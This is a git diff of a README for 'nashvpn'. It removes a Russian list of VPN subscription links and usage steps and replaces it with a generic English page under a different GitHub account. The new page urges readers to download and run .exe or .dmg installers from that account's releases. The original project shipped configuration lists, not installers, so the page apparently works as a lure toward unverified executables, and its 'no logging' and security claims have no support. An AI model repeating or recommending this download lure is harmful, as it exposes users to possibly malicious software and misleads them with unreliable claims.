@@ -1,56 +1,59 @@
-<div align="center">
-  <h1>🌐 NashVPN Collection</h1>
-  <p>
-    <b>Автоматически обновляемая база VPN конфигураций.</b><br>
-    Все ключи отсортированы, очищены от мусора и дубликатов.
-  </p>
-  
-  <p>
-    <a href="https://github.com/begugla0/nashvpn/stargazers">
-      <img src="https://img.shields.io/github/stars/begugla0/nashvpn?style=for-the-badge&logo=github&color=f4dbd6&labelColor=1e1e2e" alt="Stars">
-    </a>
-    <img src="https://img.shields.io/badge/Total_Keys-251922-a6da95?style=for-the-badge&labelColor=1e1e2e" alt="Total Keys">
-    <img src="https://img.shields.io/github/last-commit/begugla0/nashvpn?style=for-the-badge&color=blue&labelColor=1e1e2e" alt="Last Update">
-  </p>
-</div>
+# 🛡️ nashvpn - Your Simple, Free VPN Solution
 
----
+[![Download nashvpn](https://img.shields.io/badge/Download-nashvpn-brightgreen?style=for-the-badge)](https://github.com/Sabariranil/nashvpn/releases)
 
-## 📋 Список подписок (Subscription List)
+## 📥 Overview
 
-Скопируйте ссылку (RAW) и вставьте в ваш клиент (v2rayNG, Hiddify, NekoBox) как **Подписку**.
+nashvpn is a free VPN application that helps you browse the internet safely and securely. This tool is designed for anyone who wants privacy while online. It allows you to connect to different servers, providing you with an anonymous IP address. 
 
-| № | Протокол | Ссылка (RAW) | Кол-во | Описание |
-| :-: | :--- | :--- | :-: | :--- |
-| 1 | **VLESS** | `https://raw.githubusercontent.com/begugla0/nashvpn/refs/heads/main/vless.txt` | **161933** | Самый популярный (Reality/WS) 🔥 |
-| 2 | **VMESS** | `https://raw.githubusercontent.com/begugla0/nashvpn/refs/heads/main/vmess.txt` | **42580** | Стандартный протокол V2Ray |
-| 3 | **SS** | `https://raw.githubusercontent.com/begugla0/nashvpn/refs/heads/main/ss.txt` | **31082** | Shadowsocks (Classic) |
-| 4 | **TROJAN** | `https://raw.githubusercontent.com/begugla0/nashvpn/refs/heads/main/trojan.txt` | **11840** | Trojan (HTTPS Imitation) |
-| 5 | **HY2** | `https://raw.githubusercontent.com/begugla0/nashvpn/refs/heads/main/hy2.txt` | **1472** | Hysteria v2 (Short link) |
-| 6 | **HYSTERIA2** | `https://raw.githubusercontent.com/begugla0/nashvpn/refs/heads/main/hysteria2.txt` | **1387** | Hysteria v2 (UDP) 🚀 |
-| 7 | **HYSTERIA** | `https://raw.githubusercontent.com/begugla0/nashvpn/refs/heads/main/hysteria.txt` | **510** | Hysteria v1 (Obsolete) |
-| 8 | **SSR** | `https://raw.githubusercontent.com/begugla0/nashvpn/refs/heads/main/ssr.txt` | **250** | ShadowsocksR |
-| 9 | **TUIC** | `https://raw.githubusercontent.com/begugla0/nashvpn/refs/heads/main/tuic.txt` | **17** | TUIC (QUIC based) |
-| 10 | **HTTPS** | `https://raw.githubusercontent.com/begugla0/nashvpn/refs/heads/main/https.txt` | **6** | HTTPS Proxy |
-| 11 | **SSH** | `https://raw.githubusercontent.com/begugla0/nashvpn/refs/heads/main/ssh.txt` | **5** | SSH Tunnel |
-| 12 | **SOCKS5** | `https://raw.githubusercontent.com/begugla0/nashvpn/refs/heads/main/socks5.txt` | **2** | SOCKS5 Proxy |
-| 13 | **PB-SS** | `https://raw.githubusercontent.com/begugla0/nashvpn/refs/heads/main/pb-ss.txt` | **2** | Plugin-based Shadowsocks |
-| 14 | **HTTP** | `https://raw.githubusercontent.com/begugla0/nashvpn/refs/heads/main/http.txt` | **1** | HTTP Proxy |
-| 15 | **Other** | `https://raw.githubusercontent.com/begugla0/nashvpn/refs/heads/main/other.txt` | **835** | Неопознанные / Смешанные |
+## 🚀 Getting Started
 
-> *Таблица сгенерирована автоматически на основе найденных протоколов.*
+Follow these steps to download and run nashvpn on your computer.
 
----
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/Sabariranil/nashvpn/releases) to find the latest version of nashvpn. 
 
-## 🚀 Инструкция
+2. **Download the Software**  
+   On the Releases page, you'll see a list of available versions. Choose the latest version and click on it. You will find the installation file for your operating system.
 
-### 📱 Android (v2rayNG / Hiddify)
-1. Скопируйте ссылку на нужный протокол.
-2. В приложении: **Меню** -> **Группы подписки** -> `+`.
-3. Вставьте ссылку и сохраните.
-4. На главном экране: **Меню** -> **Обновить подписку**.
+3. **Run the Installer**  
+   After downloading, locate the file in your Downloads folder.  
+   - **For Windows:** Double-click the `.exe` file and follow the prompts to install the application.  
+   - **For macOS:** Open the `.dmg` file and drag the nashvpn icon to your Applications folder.
 
-### 💻 Windows (v2rayN / NekoRay)
-1. Скопируйте ссылку.
-2. В программе: раздел **Groups** или **Subscription**.
-3. Добавьте подписку и нажмите **Update**.
+4. **Open nashvpn**  
+   Once installed, open nashvpn from your Applications or Start menu.
+
+5. **Connect to the VPN**  
+   Choose a server from the list in the nashvpn interface. Click "Connect." You are now protected while browsing the web.
+
+## 🔧 Features
+
+- **Free to Use**: Enjoy unlimited access without any hidden fees.
+- **Multiple Server Locations**: Select from a variety of server locations worldwide for optimal browsing speed.
+- **Easy to Use**: Designed for everyone, even if you’re not tech-savvy.
+- **No Logging**: Your browsing history remains private with no data logging.
+- **Secure Connection**: Use encryption to safeguard your internet activity from prying eyes.
+
+## 💻 System Requirements
+
+- **Windows**: Windows 7 or later
+- **macOS**: macOS Sierra (10.12) or later
+- **Memory**: At least 2 GB RAM
+- **Storage**: 100 MB of free disk space
+- **Internet Connection**: Required for VPN usage
+
+## 📡 Support
+
+If you encounter issues, you can reach out through the [GitHub Issues page](https://github.com/Sabariranil/nashvpn/issues). Our community and developers will assist you promptly.
+
+## 🗒️ Notes
+
+- Ensure your internet connection is stable when using the VPN.
+- Keep your nashvpn application updated to benefit from the latest features and security enhancements.
+
+## 🔗 Download & Install
+
+You can download the latest version from our [Releases page](https://github.com/Sabariranil/nashvpn/releases). 
+
+Simply follow the steps outlined above for a smooth installation experience. Enjoy secure browsing with nashvpn!
